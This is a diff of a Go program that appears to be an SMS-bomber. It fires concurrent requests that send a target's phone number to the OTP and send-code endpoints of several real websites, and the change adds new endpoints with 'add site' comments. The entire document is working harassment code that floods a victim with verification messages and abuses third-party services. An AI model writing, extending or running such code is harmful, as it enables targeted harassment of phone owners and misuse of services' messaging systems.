@@ -207,32 +207,16 @@ func main() {
 		go sms("https://dr-ross.ir/users/CheckRegisterMobile?returnUrl=%2F", map[string]interface{}{
 			"mobile": phone,
 		}, ch)   // add site
-		go sms("https://flightio.com/bff/Authentication/CheckUserKey", map[string]interface{}{
-			"userKey": phone,
-		}, ch) 
-		go sms("https://flightio.com/bff/Authentication/CheckUserKey", map[string]interface{}{
-			"userKey": phone,
-		}, ch) 
-		go sms("https://flightio.com/bff/Authentication/CheckUserKey", map[string]interface{}{
-			"userKey": phone,
-		}, ch) 
-		go sms("https://flightio.com/bff/Authentication/CheckUserKey", map[string]interface{}{
-			"userKey": phone,
-		}, ch)  
-		go sms("https://flightio.com/bff/Authentication/CheckUserKey", map[string]interface{}{
-			"userKey": phone,
-		}, ch) 
-		go sms("https://flightio.com/bff/Authentication/CheckUserKey", map[string]interface{}{
-			"userKey": phone,
-		}, ch) 
-		go sms("https://flightio.com/bff/Authentication/CheckUserKey", map[string]interface{}{
-			"userKey": phone,
-		}, ch) 
-
-   
-
-
-
+		go sms("https://gw.jabama.com/api/v4/account/send-code", map[string]interface{}{
+			"mobile": phone,
+		}, ch)   // add site
+		go sms("https://uiapi2.saapa.ir/api/otp/sendCode", map[string]interface{}{
+			"mobile": phone,
+		}, ch)   // add site
+		go sms("https://api.epasazh.com/api/v4/blind-otp", map[string]interface{}{
+			"mobile": phone,
+		}, ch)   // add site
+/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 		go sms("https://flightio.com/bff/Authentication/CheckUserKey", map[string]interface{}{
 			"userKey": phone,
 		}, ch)   // just check
